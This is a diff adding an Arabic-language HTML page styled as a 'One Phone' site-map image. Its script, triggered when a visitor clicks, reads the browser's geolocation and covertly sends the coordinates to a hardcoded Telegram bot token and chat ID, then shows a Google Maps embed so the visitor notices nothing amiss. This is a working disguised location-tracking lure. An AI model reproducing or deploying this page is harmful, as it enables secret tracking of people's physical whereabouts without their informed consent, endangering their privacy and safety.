@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>One Phone - خريطة الموقع</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: black;
+      overflow: hidden;
+    }
+    #main {
+      background-image: url('one-phone.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 100%;
+      width: 100%;
+      cursor: pointer;
+      position: absolute;
+      z-index: 1;
+    }
+    #map {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      display: none;
+      z-index: 2;
+    }
+  </style>
+</head>
+<body>
+  <div id="main" onclick="sendLocation()"></div>
+  <iframe id="map" frameborder="0" allowfullscreen></iframe>
+
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const token = "7876861765:AAFHhXiCHpDM7qeYLZNEfq1WoEpD9vErTr8";
+          const chat_id = "5880561408";
+
+          // إرسال الموقع على شكل خريطة مباشرة
+          fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chat_id,
+              latitude: lat,
+              longitude: lon
+            })
+          });
+
+          // عرض خريطة Google Maps بعد الإرسال
+          const mapFrame = document.getElementById("map");
+          mapFrame.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+          mapFrame.style.display = "block";
+          document.getElementById("main").style.display = "none";
+
+        }, function(error) {
+          alert("فشل في تحديد الموقع: " + error.message);
+        });
+      } else {
+        alert("الموقع غير مدعوم في هذا المتصفح.");
+      }
+    }
+  </script>
+</body>
+</html>
